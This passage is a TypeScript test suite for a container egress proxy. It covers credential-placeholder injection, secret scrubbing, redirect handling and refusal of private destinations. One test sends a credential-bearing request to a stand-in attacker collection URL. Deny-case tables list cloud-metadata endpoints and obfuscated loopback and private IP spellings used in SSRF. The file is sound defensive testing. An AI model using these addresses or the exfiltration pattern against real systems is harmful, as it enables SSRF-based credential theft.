// Defends credential injection without exposing the secret to a guest.
// Native network policy and vault routing are also measured by gate:egress-interception.
import { describe, expect, mock, test } from 'bun:test';
import {
  EGRESS_PLACEHOLDER_PREFIX, refusedHostname,
} from '@kinu.run/core';
import type { KinuDevbox } from '../src/kinu-devbox';
// Static: neither module reaches `cloudflare:email`, so neither needs the mock below.
import { adaptCloudflareSandbox } from '../src/sandbox-exec-lane';
import type { ApprovalGrant, EgressInjectionResult, EgressRequestFacts, UserCaller } from '@kinu.run/core';
import type { ContainerEgressEnv, ContainerEventResolver, EgressWorkspace, KinuEgressParams } from '../src/egress/outbound';
import { mockAgentsSdk } from './helpers/agents-sdk';
import { jsrpcStub } from './helpers/jsrpc-stub';
import {
  createRecordingLogger, setDiagnosticsSink, type RecordedLog,
} from '@kinu.run/core/obs';
import { closeReason, KINU_USER_AGENT, kinuUserAgent, reoriginateRequest } from '@kinu.run/core';
import { present } from '@kinu.run/test-utils';

// `agents` reaches `cloudflare:email`: mock first, then dynamic imports.
mockAgentsSdk();

const {
  CONTAINER_EVENT_HOST,
  handleContainerEgress, handleContainerEvent, handleEgressConnect, handleEgressTls, parseEgressParams,
} = await import('../src/egress/outbound');

const {
  eventsOver, orchestratorHarness,
} = await import('./helpers/actor-harness');

const { stubOf } = await import('./helpers/platform-context');


const SECRET = ['sk_live_', 'abcdefghij0123456789'].join('');

const PLACEHOLDER = `${EGRESS_PLACEHOLDER_PREFIX}${'Q'.repeat(43)}`;


const PARAMS: KinuEgressParams = { workspaceName: 'kinu-main', ownerUserId: 'user-1' };

const STRIPE_GRANT: ApprovalGrant = { rule: 'egress-secret:stripe', executor: 'computer' };

/** The workspace's grants as the egress asks for them: Stripe's, for every request that names a placeholder. */
const WORKSPACE: EgressWorkspace = { grants: async () => [STRIPE_GRANT] };

/** `get` returns a `jsrpcStub`: the real binding is a Proxy, and a literal double hid a TypeError here. */
function fakeEnv(resolve: () => EgressInjectionResult): ContainerEgressEnv<string> {
  return {
    UserDO: {
      idFromName: (name: string) => name,
      get: () => jsrpcStub({ resolveEgressInjection: async () => resolve() }),
    },
    CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
  };
}

interface FetchCapture {
  readonly seen: Request[];
  readonly restore: () => void;
}

function captureFetch(response: () => Response): FetchCapture {
  const seen: Request[] = [];
  const original = globalThis.fetch;

  const stub: typeof globalThis.fetch = Object.assign(
    async (input: Parameters<typeof globalThis.fetch>[0], init?: Parameters<typeof globalThis.fetch>[1]) => {
      const request = input instanceof Request ? input : new Request(String(input), init);
      seen.push(request);

      return response();
    },
    { preconnect: original.preconnect },
  );

  globalThis.fetch = stub;

  return { seen, restore: () => { globalThis.fetch = original; } };
}

/** `KinuDevbox` is a DO class a test cannot construct; implements only what the preflight reaches. */
function execOnlyBox(): KinuDevbox {
  return Object.create({
    resolveReadiness: async () => ({ kind: 'restored' as const }),
    exec: async () => ({ stdout: 'done', stderr: '', exitCode: 0 }),
    releaseExec: async () => {},
  });
}

describe('the secret reaches the upstream and comes back scrubbed', () => {
  test('the placeholder becomes the secret on the wire to the bound host', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', {
          method: 'POST', headers: { authorization: `Bearer ${PLACEHOLDER}` },
        }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
        PARAMS, WORKSPACE,
      );

      expect(response.status).toBe(200);
      expect(upstream.seen).toHaveLength(1);
      expect(upstream.seen[0].headers.get('authorization')).toBe(`Bearer ${SECRET}`);
      // Following redirects would replay the injected credential to whatever host the upstream names.
      expect(upstream.seen[0].redirect).toBe('manual');
    } finally { upstream.restore(); }
  });

  test('an echoed secret is scrubbed out of the body, headers and status text', async () => {
    const upstream = captureFetch(() => new Response(
      `invalid api key: ${SECRET}`,
      {
        status: 401,
        statusText: `rejected ${SECRET}`,
        headers: { 'www-authenticate': `Bearer error="${SECRET}"`, location: `/retry?k=${SECRET}` },
      },
    ));

    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
        PARAMS, WORKSPACE,
      );

      const body = await response.text();
      expect(body).not.toContain(SECRET);
      expect(body).toContain(PLACEHOLDER);
      expect(response.headers.get('www-authenticate')).not.toContain(SECRET);
      expect(response.headers.get('location')).not.toContain(SECRET);
      expect(response.statusText).not.toContain(SECRET);
    } finally { upstream.restore(); }
  });

  test('a refusal names no secret', async () => {
    const response = await handleContainerEgress(
      new Request('https://attacker.test/collect', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
      fakeEnv(() => ({ kind: 'refuse', status: 403, reason: 'bound to api.stripe.com' })),
      PARAMS, WORKSPACE,
    );

    expect(response.status).toBe(403);
    expect(await response.text()).not.toContain(SECRET);
  });

  test('an unconfigured container is refused, never forwarded', async () => {
    const upstream = captureFetch(() => new Response('should not happen'));

    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/'), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), undefined, WORKSPACE,
      );

      expect(response.status).toBe(503);
      expect(upstream.seen).toHaveLength(0);
    } finally { upstream.restore(); }
  });

  // A workspace's npm install sends hundreds of requests through here; none names a secret, so none waits on the vault.
  test('traffic with no placeholder is forwarded without asking the vault, which may be down', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      const response = await handleContainerEgress(
        new Request('https://registry.npmjs.org/express'), throwingVaultEnv({ cause: new Error('durable object reset') }), PARAMS, WORKSPACE,
      );

      expect(response.status).toBe(200);
      expect(upstream.seen.map((request) => request.url)).toEqual(['https://registry.npmjs.org/express']);
    } finally { upstream.restore(); }
  });

  test('traffic with no placeholder is forwarded untouched', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      await handleContainerEgress(
        new Request('https://example.com/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
        PARAMS, WORKSPACE,
      );
      expect(upstream.seen[0].url).toBe('https://example.com/');
      expect(upstream.seen[0].headers.get('authorization')).toBeNull();
    } finally { upstream.restore(); }
  });
});

describe('what the container is configured with', () => {
  test('params are parsed, so a malformed configuration reads as unconfigured', () => {
    expect(parseEgressParams({ props: PARAMS })).toEqual(PARAMS);
    expect(parseEgressParams({ props: { workspaceName: 'w' } })).toBeUndefined();
    expect(parseEgressParams({ props: undefined })).toBeUndefined();
  });
});

describe('the vault is read when a request names a secret, never before', () => {
  test('a placeholder is planned by the vault against the workspace\'s grants as it asks', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    const env: ContainerEgressEnv<string> = {
      UserDO: {
        idFromName: (name: string) => name,
        get: () => jsrpcStub({
          // The secret is spent only under the workspace's grant.
          resolveEgressInjection: async (_caller: UserCaller, _facts: EgressRequestFacts, grants: readonly ApprovalGrant[]): Promise<EgressInjectionResult> => (
            grants.includes(STRIPE_GRANT)
              ? { kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] }
              : { kind: 'refuse', status: 403, reason: 'not bound to any approved secret' }
          ),
        }),
      },
      CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
    };

    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), env, PARAMS, WORKSPACE,
      );

      expect(response.status).toBe(200);
      expect(upstream.seen[0]?.headers.get('authorization')).toBe(`Bearer ${SECRET}`);
    } finally { upstream.restore(); }
  });

  test('a deployment with no root secret refuses only the request that names a secret, and says why', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    const env: ContainerEgressEnv<string> = {
      UserDO: {
        idFromName: (name: string) => name,
        get: () => jsrpcStub({ resolveEgressInjection: async () => { throw new Error('no vault is reached without a root secret'); } }),
      },
    };

    try {
      const named = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), env, PARAMS, WORKSPACE,
      );

      const plain = await handleContainerEgress(new Request('https://registry.npmjs.org/express'), env, PARAMS, WORKSPACE);

      expect(named.status).toBe(503);
      expect(plain.status).toBe(200);
      expect(upstream.seen.map((request) => request.url)).toEqual(['https://registry.npmjs.org/express']);
    } finally { upstream.restore(); }
  });
});

describe('the workspace\'s grants are read as they stand', () => {
  test('a secret granted after the egress was minted is spent on the next request, without a restart', async () => {
    const granted: ApprovalGrant[] = [];
    const upstream = captureFetch(() => new Response('ok'));

    const env: ContainerEgressEnv<string> = {
      UserDO: {
        idFromName: (name: string) => name,
        get: () => jsrpcStub({
          resolveEgressInjection: async (_caller: UserCaller, _facts: EgressRequestFacts, grants: readonly ApprovalGrant[]): Promise<EgressInjectionResult> => (
            grants.length === 0
              ? { kind: 'refuse', status: 403, reason: 'not bound to any approved secret' }
              : { kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] }
          ),
        }),
      },
      CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
    };

    const request = () => new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } });

    try {
      const before = await handleContainerEgress(request(), env, PARAMS, { grants: async () => [...granted] });

      granted.push(STRIPE_GRANT);
      const after = await handleContainerEgress(request(), env, PARAMS, { grants: async () => [...granted] });

      expect([before.status, after.status]).toEqual([403, 200]);
      expect(upstream.seen.map((sent) => sent.headers.get('authorization'))).toEqual([`Bearer ${SECRET}`]);
    } finally { upstream.restore(); }
  });

  test('a request that names no placeholder asks neither the workspace nor the vault', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      // Both throw if asked: a forwarded request is the proof neither was.
      const response = await handleContainerEgress(
        new Request('https://registry.npmjs.org/express'), throwingVaultEnv({ cause: new Error('the vault is not asked') }), PARAMS,
        { grants: async () => { throw new Error('the workspace is not asked'); } },
      );

      expect(response.status).toBe(200);
    } finally { upstream.restore(); }
  });

  test('a workspace that cannot answer for its grants refuses the request that names a secret, and sends nothing', async () => {
    const upstream = captureFetch(() => new Response('should not happen'));

    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })), PARAMS,
        { grants: async () => { throw new Error('the workspace object reset'); } },
      );

      expect(response.status).toBe(503);
      expect(upstream.seen).toHaveLength(0);
    } finally { upstream.restore(); }
  });
});

describe('configuration is awaited before the container runs', () => {
  test('the first operation configures once, and concurrent callers share it', async () => {
    let configured = 0;
    let released: () => void = () => {};

    const gate = new Promise<void>((resolve) => { released = resolve; });

    // `null`: an exec-only box publishes no previews (see `adaptCloudflareSandbox`'s exposePort).
    const handle = adaptCloudflareSandbox(
      execOnlyBox(),
      async () => { configured += 1; await gate; },
      null,
    );

    const both = Promise.all([handle.exec('a'), handle.exec('b')]);
    released();
    expect((await both).map((r) => r.stdout)).toEqual(['done', 'done']);
    expect(configured).toBe(1);
  });

  test('a failed configuration is not cached, so the next call retries', async () => {
    let attempts = 0;

    const handle = adaptCloudflareSandbox(
      execOnlyBox(),
      async () => {
        attempts += 1;

        if (attempts === 1) throw new Error('root unreachable');
      },
      null,
    );

    await expect(handle.exec('a')).rejects.toThrow('root unreachable');
    expect((await handle.exec('a')).stdout).toBe('done');
    expect(attempts).toBe(2);
  });

  test('EVERY operation that can start the container waits for it — including the file lanes',
    async () => {
      // A cold file op must not start the container itself and read a blank disk.
      const order: string[] = [];

      const box: KinuDevbox = Object.create({
        resolveReadiness: async () => {
          order.push('resolveReadiness');

          return { kind: 'restored' as const };
        },
        readFile: async () => {
          order.push('readFile');

          return { content: '' };
        },
        writeFile: async () => {
          order.push('writeFile');

          return undefined;
        },
        listFiles: async () => {
          order.push('listFiles');

          return { files: [] };
        },
        deleteFile: async () => {
          order.push('deleteFile');

          return undefined;
        },
      });

      const handle = adaptCloudflareSandbox(box, async () => { order.push('configureEgress'); }, null);

      await handle.readFile('/workspace/a');
      await handle.writeFile('/workspace/a', 'x');
      await handle.listFiles('/workspace');
      await handle.deleteFile('/workspace/a');

      expect(order).toEqual([
        'configureEgress', 'resolveReadiness', 'readFile',
        'resolveReadiness', 'writeFile',
        'resolveReadiness', 'listFiles',
        'resolveReadiness', 'deleteFile',
      ]);
    });
});

describe('reachability of the container event channel', () => {
  test('a container event reaches its workspace through the object\'s RPC surface', async () => {
    const workspace = orchestratorHarness();
    const change = { kind: 'file_changed', path: '/workspace/notes.md', change: 'modified' } as const;

    // The resolver hands out the stub a binding would: a method the object's seal hides is refused.
    const response = await handleContainerEvent(
      new Request(`https://${CONTAINER_EVENT_HOST}/v1/events`, { method: 'POST', body: JSON.stringify(change) }),
      async () => stubOf(workspace.agent),
      PARAMS,
    );

    expect(response.status, await response.clone().text()).toBe(202);
    expect(eventsOver(workspace.db).query({ variant: 'file_changed' }).map((event) => event.payload))
      .toEqual([{ path: change.path, change: change.change }]);
  });

  test('the event channel lives on a name that resolves nowhere public', () => {
    expect(CONTAINER_EVENT_HOST.endsWith('.internal')).toBe(true);
  });
});


// A JSRPC stub is a Proxy: `Object.assign`/spread copy nothing off it. The lint
// `anti-slop/no-copy-rpc-stub` detects copies; this pins that the double behaves like a stub.
describe('a stub is used, never copied', () => {
});

async function recordDiagnostics(body: () => Promise<void>): Promise<readonly RecordedLog[]> {
  const logger = createRecordingLogger();
  const restore = setDiagnosticsSink(logger);

  try { await body(); } finally { restore(); }

  return logger.emitted;
}

/** The vault call throws, as a DO under load or mid-eviction answers a cross-object RPC. */
function throwingVaultEnv(thrown: { cause: unknown }): ContainerEgressEnv<string> {
  return {
    UserDO: {
      idFromName: (name: string) => name,
      get: () => jsrpcStub({ resolveEgressInjection: async () => { throw thrown.cause; } }),
    },
    CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
  };
}

function throwingEventResolver(thrown: { cause: unknown }): ContainerEventResolver {
  return async () => jsrpcStub({ acceptContainerEvent: async () => { throw thrown.cause; } });
}

// KINU-055. Every request leaving a container says Kinu, first.
describe('one User-Agent for everything a container sends', () => {
  test('traffic with no placeholder carries the Kinu identity', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      await handleContainerEgress(
        new Request('https://example.com/', { headers: { 'user-agent': 'curl/8.5.0' } }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
        PARAMS, WORKSPACE,
      );
      expect(upstream.seen[0].headers.get('user-agent')).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
    } finally { upstream.restore(); }
  });

  test('the secret-bearing path carries the same identity — one policy, not two', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', {
          method: 'POST', headers: { authorization: `Bearer ${PLACEHOLDER}`, 'user-agent': 'curl/8.5.0' },
        }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
        PARAMS, WORKSPACE,
      );
      expect(upstream.seen[0].headers.get('user-agent')).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
    } finally { upstream.restore(); }
  });

  test('a container that sends no User-Agent still identifies as Kinu', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      await handleContainerEgress(
        new Request('https://example.com/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
        PARAMS, WORKSPACE,
      );
      expect(upstream.seen[0].headers.get('user-agent')).toBe(KINU_USER_AGENT);
    } finally { upstream.restore(); }
  });

  test('the caller keeps its own tokens, behind ours, and cannot displace them', () => {
    expect(kinuUserAgent('python-requests/2.32')).toBe(`${KINU_USER_AGENT} python-requests/2.32`);
    expect(kinuUserAgent(null)).toBe(KINU_USER_AGENT);
    expect(kinuUserAgent('   ')).toBe(KINU_USER_AGENT);
    // A field value with a control character is not one. Dropped whole rather
    // than repaired: a repaired identity is a different identity.
    expect(kinuUserAgent('evil\u0000agent')).toBe(KINU_USER_AGENT);
    // A second interception hop must not stack the token again.
    expect(kinuUserAgent(`${KINU_USER_AGENT} curl/8.5.0`)).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
  });
});

// KINU-017: the handler hands the runtime the body it was given, which framing derives from
// (wire measured in `tests/workerd/egress-framing.test.ts`).
describe('the forwarded body is the container\'s own, not a copy of it', () => {
  test('the request that leaves carries the inbound body object itself', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      // `duplex` is required by fetch for a stream body but absent from the Workers `RequestInit` type.
      const init: RequestInit & { duplex: 'half' } = {
        method: 'POST',
        body: new ReadableStream<Uint8Array>({
          start(controller) { controller.enqueue(new Uint8Array([1, 2, 3])); controller.close(); },
        }),
        duplex: 'half',
      };

      const inbound = new Request('https://example.com/upload', init);
      const body = inbound.body;
      await handleContainerEgress(
        inbound, fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
      );
      expect(upstream.seen[0].body).toBe(body);
    } finally { upstream.restore(); }
  });

  test('a bodyless request re-originates without one', () => {
    const rebuilt = reoriginateRequest(
      new Request('https://example.com/thing'),
      'https://example.com/thing',
      { headers: new Headers(), redirect: 'follow' },
    );

    expect(rebuilt.body).toBeNull();
  });
});

// KINU-037. A throwing outbound handler returns no HTTP response ("Empty reply from server").
describe('a throw at the boundary becomes a classified answer', () => {
  test('an unreachable vault answers 503 and names the class, not the request', async () => {
    let response: Response | undefined;

    const emitted = await recordDiagnostics(async () => {
      response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
        throwingVaultEnv({ cause: new Error('durable object reset') }),
        PARAMS, WORKSPACE,
      );
    });

    expect(response?.status).toBe(503);
    const body = await present(response, 'the egress response').text();
    expect(body).toContain('unavailable');
    expect(body).toContain('api.stripe.com');

    expect(emitted).toHaveLength(1);
    expect(emitted[0].event).toBe('egress.authority_unreachable');
    expect(emitted[0].code).toBe('unavailable');
    expect(emitted[0].cause).toContain('asking the owner vault');
    expect(emitted[0].cause).toContain('durable object reset');
  });

  test('a deadline on the vault is 504, not 503 — the two imply different retries', async () => {
    const timeout = new DOMException('The operation timed out', 'TimeoutError');

    const response = await handleContainerEgress(
      new Request('https://api.stripe.com/', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }), throwingVaultEnv({ cause: timeout }), PARAMS, WORKSPACE,
    );

    expect(response.status).toBe(504);
  });

  test('an upstream that cannot be reached answers 502 with the failure class', async () => {
    const upstream = captureFetch(() => { throw new Error('connection refused'); });
    let response: Response | undefined;

    try {
      const emitted = await recordDiagnostics(async () => {
        response = await handleContainerEgress(
          new Request('https://example.com/'),
          fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
          PARAMS, WORKSPACE,
        );
      });

      expect(response?.status).toBe(502);
      expect(await present(response, 'the egress response').text()).toContain('example.com');
      expect(emitted).toHaveLength(1);
      expect(emitted[0].event).toBe('egress.upstream_failed');
      expect(emitted[0].cause).toContain('connection refused');
    } finally { upstream.restore(); }
  });

  test('an upstream failure quoting the substituted URL never records the secret', async () => {
    // workerd's fetch failure quotes the revealed URL; wrapping it would log the credential.
    const upstream = captureFetch(() => {
      throw new Error(`Fetch API cannot load: https://api.stripe.com/v1/charges?key=${SECRET}`);
    });

    let response: Response | undefined;

    try {
      const emitted = await recordDiagnostics(async () => {
        response = await handleContainerEgress(
          new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
          fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
          PARAMS, WORKSPACE,
        );
      });

      expect(response?.status).toBe(502);
      expect(await present(response, 'the egress response').text()).not.toContain(SECRET);
      expect(emitted[0].cause).not.toContain(SECRET);
      // Scrubbed, not deleted: operators correlate on the placeholder.
      expect(emitted[0].cause).toContain(PLACEHOLDER);
    } finally { upstream.restore(); }
  });

  test('the event channel answers when its workspace object refuses the RPC', async () => {
    let response: Response | undefined;

    const emitted = await recordDiagnostics(async () => {
      response = await handleContainerEvent(
        new Request(`https://${CONTAINER_EVENT_HOST}/v1/events`, {
          method: 'POST', body: JSON.stringify({ kind: 'note' }),
        }),
        throwingEventResolver({ cause: new Error('object evicted mid-write') }),
        PARAMS,
      );
    });

    expect(response?.status).toBe(503);
    // The container must know the event is not recorded, or it drops it.
    expect(await present(response, 'the egress response').text()).toContain('send it again');
    expect(emitted[0].event).toBe('egress.event_channel_unreachable');
    expect(emitted[0].cause).toContain('object evicted mid-write');
  });
});

// KINU-086 enforcement (judgment lives in core's `safety/egress-destination.ts`): refuse
// before the vault call, and hand back every redirect hop so it is re-judged.
describe('private destinations are refused at the one place requests leave', () => {
  test.each([
    ['RFC1918 10/8', 'http://10.0.0.5/'],
    ['RFC1918 172.16/12', 'http://172.16.0.1/'],
    ['RFC1918 192.168/16', 'http://192.168.1.1/'],
    ['loopback 127/8', 'http://127.0.0.1/'],
    ['CGNAT 100.64/10', 'http://100.64.0.1/'],
    ['this-network 0.0.0.0/8', 'http://0.0.0.0/'],
    ['metadata address', 'http://169.254.169.254/latest/meta-data/'],
    ['link-local 169.254/16', 'http://169.254.0.1/'],
    ['reserved name localhost', 'http://localhost:8080/'],
    ['reserved domain .localhost', 'http://api.service.localhost/'],
    ['reserved metadata names', 'http://metadata.google.internal/computeMetadata/v1/'],
    ['IPv6 loopback', 'http://[::1]/'],
    ['IPv6 link-local', 'http://[fe80::1]/'],
    ['IPv6 ULA', 'http://[fd00::119:1]/'],
    ['IPv6 mapped private', 'http://[::ffff:169.254.169.254]/'],
  ])('%s is refused before the vault is asked', async (_label, target) => {
    const upstream = captureFetch(() => new Response('should not happen'));

    try {
      const refusal = await handleContainerEgress(
        new Request(target), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
      );

      expect(refusal.status).toBe(403);
      expect(await refusal.json()).toMatchObject({ reason: 'denied' });
      expect(upstream.seen).toHaveLength(0);
    } finally { upstream.restore(); }
  });

  test('the refusal is recorded with the classification and host only', async () => {
    const emitted = await recordDiagnostics(async () => {
      await handleContainerEgress(
        new Request('http://169.254.169.254/latest/meta-data/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
      );
    });

    expect(emitted[0].event).toBe('egress.private_destination');
    expect(emitted[0].code).toBe('denied');
    // Host only; one shape across the shared classifier's seams (see unit-codemode-egress.test.ts).
    expect(emitted[0].fields).toEqual({ host: '169.254.169.254', seam: 'container' });
  });

  test('the public control still succeeds end to end', async () => {
    const upstream = captureFetch(() => new Response('ok'));

    try {
      const response = await handleContainerEgress(
        new Request('https://example.com/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
      );

      expect(response.status).toBe(200);
      expect(upstream.seen).toHaveLength(1);
    } finally { upstream.restore(); }
  });

  test('the classifier shares one judgment with core, at the CF boundary', () => {
    expect(refusedHostname('[fe80::1]')).toMatchObject({ reason: 'denied' });
    expect(refusedHostname('2606:4700:4700::1111')).toBeNull();
  });
});

describe('every redirect hop is judged, not trusted', () => {
  test('the runtime never follows: the 3xx is handed back for re-judgment', async () => {
    const hop = captureFetch(() => new Response(null, {
      status: 302, headers: { location: 'http://169.254.169.254/latest/meta-data/' },
    }));

    try {
      const first = await handleContainerEgress(
        new Request('https://public.example/start'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
      );

      expect(first.status).toBe(302);
      // Manual redirect: the hop's next request is the container's and re-enters the handler.
      expect(hop.seen[0].redirect).toBe('manual');
    } finally { hop.restore(); }
  });

  test('the redirected request re-enters the handler and is refused at the hop', async () => {
    const refused = captureFetch(() => new Response('should not happen'));

    try {
      const second = await handleContainerEgress(
        new Request('http://169.254.169.254/latest/meta-data/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS, WORKSPACE,
      );

      expect(second.status).toBe(403);
      expect(await second.json()).toMatchObject({ reason: 'denied' });
      expect(refused.seen).toHaveLength(0);
    } finally { refused.restore(); }
  });
});

/** A program's socket as the egress's connect handler receives it, naming `address`; records whether it was closed. */
function inboundSocket(address: string): Socket & { readonly wasClosed: () => boolean } {
  let closed = false;

  // workerd's `Socket` has no constructor a test can call; the handler reads only these members.
  const socket: Socket & { readonly wasClosed: () => boolean } = {
    opened: Promise.resolve({ localAddress: address }),
    closed: new Promise<void>(() => {}),
    upgraded: false,
    secureTransport: 'off',
    readable: new ReadableStream(),
    writable: new WritableStream(),
    close: async () => { closed = true; },
    startTls: () => { throw new Error('not reached'); },
    wasClosed: () => closed,
  };

  return socket;
}

// Owner's rule (2026-10-10): a workspace program's raw socket is judged by where it goes, as a request is, and only that.
describe('a workspace program\'s TCP socket', () => {
  // The private addresses in other spellings: 2026-10-12 security review, the judge saw the raw string and the socket
  // went to whatever the platform made of it.
  test.each([
    '127.0.0.1:5432', '10.0.0.7:22', '[::1]:6379', 'metadata.google.internal:80', 'db.localhost:5432',
    '0x7f.0.0.1:5432', '0x7f.1:5432', '012.0.0.1:22', '2130706433:80', '64:ff9b::7f00:1:6379', '64:ff9b::a00:1:22',
    '2002:7f00:1:::80', '2002:a00:1:::22', '198.18.0.1:80', '[64:ff9b::a00:1]:22', '[2001:0:4136:e378:8000:63bf:80ff:fffe]:80',
  ])('to %p is refused before anything is dialled', async (address) => {
    const socket = inboundSocket(address);

    dialled.length = 0;
    await recordDiagnostics(async () => { await handleEgressConnect(socket, PARAMS); });

    expect(socket.wasClosed()).toBe(true);
    expect(dialled).toEqual([]);
  });

  test('to a public host goes where it was judged, in the form it was judged', async () => {
    // Programs that send nothing and hang up, so each carried socket ends.
    const quiet = (address: string) => ({ ...inboundSocket(address), readable: ended() });

    dialled.length = 0;
    await handleEgressConnect(quiet('DB.Example.COM.:5432'), PARAMS);
    await handleEgressConnect(quiet('[2606:4700:4700:0:0:0:0:1111]:53'), PARAMS);

    // connect() reaches an IPv6 literal only bracketed (PLATFORM_CATALOG 'worker.connect.address_forms').
    expect(dialled.map(({ hostname, port }) => ({ hostname, port }))).toEqual([
      { hostname: 'db.example.com', port: 5432 }, { hostname: '[2606:4700:4700::1111]', port: 53 },
    ]);
  });

  test('refused under a keyed name logs where it went, never the name\'s tags', async () => {
    const tags = 'ab'.repeat(32);
    const keyed = `${Buffer.from('10.0.0.7').toString('hex')}.k.${tags.slice(0, 62)}.${tags.slice(62)}.tcp.nimbus-egress.invalid:5432`;

    const emitted = await recordDiagnostics(async () => { await handleEgressConnect(inboundSocket(keyed), PARAMS); });

    expect(JSON.stringify(emitted)).not.toContain(tags.slice(0, 16));
  });

  test('from an unconfigured workspace is refused, as its requests are', async () => {
    const socket = inboundSocket('example.com:5432');

    await handleEgressConnect(socket, undefined);

    expect(socket.wasClosed()).toBe(true);
  });

  test('that names no port is refused', async () => {
    const socket = inboundSocket('example.com');

    await handleEgressConnect(socket, PARAMS);

    expect(socket.wasClosed()).toBe(true);
  });
});

/** Where the egress asked the platform to connect, and which name the server's certificate is checked against. */
interface Dialled {
  hostname: string;
  port: number;
  checks: string | null;
}

/** Every TLS dial this file's stand-in for `cloudflare:sockets` was asked for. */
const dialled: Dialled[] = [];

/** A connection whose server says nothing and hangs up, so a socket carried over it ends. */
const ended = () => new ReadableStream<Uint8Array>({ start: (controller) => { controller.close(); } });

const opened = () => ({ readable: ended(), writable: new WritableStream<Uint8Array>(), opened: Promise.resolve() });

await mock.module('cloudflare:sockets', () => ({
  connect: (target: { hostname: string; port: number }, options: { secureTransport: string }) => {
    // TLS from the start checks the host; a later startTls checks the name it is given.
    const record: Dialled = { ...target, checks: options.secureTransport === 'on' ? target.hostname : null };

    dialled.push(record);

    return {
      ...opened(),
      startTls: (tls: { expectedServerHostname: string }) => {
        record.checks = tls.expectedServerHostname;

        return opened();
      },
    };
  },
}));

// A program's TLS socket arrives as Nimbus's connectTls call (NIMBUS-ASKS #44): the host is judged, then the session is
// made here, checking the server by the program's servername where it named one other than the host, as Node does.
describe('a workspace program\'s TLS socket', () => {
  // A target names its host as the program wrote it: no URL parser has made it canonical. 2026-10-12 security review:
  // the judge saw the raw string and the session went to whatever the platform made of it.
  test.each([
    '127.0.0.1', '10.0.0.7', 'metadata.google.internal', 'localhost.', 'LOCALHOST',
    '0x7f.1', '0x7f.0.0.1', '012.0.0.1', '0177.0.0.1', '127.1', '2130706433',
    '::1', '[::1]', '0:0:0:0:0:0:0:1', '::', '::ffff:127.0.0.1', '::ffff:7f00:1', '::ffff:169.254.169.254', 'fe80::a', 'fec0::1', 'fd00::1',
    '64:ff9b::a00:1', '64:ff9b::7f00:1', '64:ff9b:1::5', '2002:7f00:1::', '[2002:c0a8:101::]', '2001:0:4136:e378:8000:63bf:80ff:fffe',
    '198.18.0.1', '198.19.255.255', '192.0.0.8', '224.0.0.251', '255.255.255.255', 'ff02::fb', '100::1', '2001:db8::1',
    '', 'exa mple.com', 'a.1', '1.2.3.4.5', '[::1', '::g', 'not:an:ipv6:', '12zz::1', '1.2.3.4::', '::1.2.3', 'fe80::1%eth0', '1:2:3:4:5:6:7:8:9',
  ])('to %p is refused before anything is dialled', async (hostname) => {
    dialled.length = 0;
    await recordDiagnostics(async () => {
      await expect(handleEgressTls({ hostname, port: 443 }, PARAMS)).rejects.toMatchObject({ code: 'denied' });
    });

    expect(dialled).toEqual([]);
  });

  test('from an unconfigured workspace is refused, as its requests are', async () => {
